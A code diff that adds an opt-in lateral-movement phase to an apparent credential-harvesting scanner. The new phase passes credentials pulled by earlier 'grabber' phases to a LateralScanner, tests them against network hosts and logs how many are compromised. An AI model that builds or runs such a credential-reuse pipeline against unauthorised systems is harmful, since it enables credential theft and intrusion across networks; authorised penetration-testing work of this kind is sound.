@@ -121,6 +121,7 @@ class ScanContext:
                  output_path: str | None = None,
                  grabbers_enabled: bool = True,
                  enabled_grabbers: list[str] | None = None,
+                 lateral_config: Any = None,
                  **_extra: Any):  # Accept extra profile kwargs gracefully
         self.target_paths = target_paths
         self.max_threads = max_threads
@@ -131,6 +132,7 @@ class ScanContext:
         self.output_path = output_path
         self.grabbers_enabled = grabbers_enabled
         self.enabled_grabbers = enabled_grabbers  # None = all default-enabled
+        self.lateral_config = lateral_config
 
         # Scan state
         self.start_time = datetime.now()
@@ -425,6 +427,12 @@ class TreasureScanner:
             if not self.context.should_terminate():
                 self._sweep_phase()
 
+            # Phase 4: Lateral movement (opt-in)
+            if (not self.context.should_terminate()
+                    and self.context.lateral_config
+                    and getattr(self.context.lateral_config, 'enabled', False)):
+                self._lateral_phase()
+
         except Exception as e:
             logger.error(f"Scan failed: {e}")
             self.context.add_error(f"Critical scan failure: {e}")
@@ -447,6 +455,7 @@ class TreasureScanner:
             errors=self.context.errors,
             skipped_paths=self.context.skipped_paths,
             grabber_results=grabber_results,
+            lateral_result=getattr(self, '_lateral_result', None),
         )
 
         # Finalize streaming output
@@ -583,6 +592,25 @@ class TreasureScanner:
 
         total_creds = len(self._grabber_context.all_credentials)
         logger.info(f"Grabber phase complete: {total_creds} credentials extracted")
+
+    def _lateral_phase(self) -> None:
+        """Phase 4: Lateral movement -- test extracted creds against network hosts."""
+        from .lateral import LateralScanner
+
+        logger.info("Phase 4: Lateral Movement")
+
+        if not self._grabber_context or not self._grabber_context.all_credentials:
+            logger.info("No credentials available for lateral movement")
+            return
+
+        scanner = LateralScanner(
+            config=self.context.lateral_config,
+            credentials=self._grabber_context.all_credentials,
+            reporter=self._reporter,
+        )
+        self._lateral_result = scanner.run()
+        total = self._lateral_result.targets_compromised
+        logger.info(f"Lateral phase complete: {total} host(s) compromised")
 
     def _sweep_phase(self) -> None:
         """Phase 3: Comprehensive scan of all remaining locations."""
